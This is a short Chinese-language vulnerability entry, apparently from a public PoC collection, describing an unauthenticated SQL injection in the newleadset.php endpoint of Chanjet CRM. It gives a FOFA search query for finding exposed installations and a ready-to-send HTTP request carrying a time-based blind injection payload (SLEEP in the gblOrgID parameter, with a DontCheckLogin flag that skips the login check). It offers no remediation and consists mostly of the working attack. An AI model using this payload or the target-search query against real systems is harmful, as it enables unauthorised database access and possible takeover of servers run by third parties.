# 畅捷通CRM系统newleadset.php接口存在SQL注入漏洞

用友畅捷CRM newleadset.php 处存在SQL注入漏洞 ，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```java
app="畅捷通-畅捷CRM"
```

## poc

```javascript
GET /lead/newleadset.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(5)))HAjH)--+-&DontCheckLogin=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
```

![img](https://i-blog.csdnimg.cn/direct/7ad8cbe1115b4e718331016152dc26ee.png)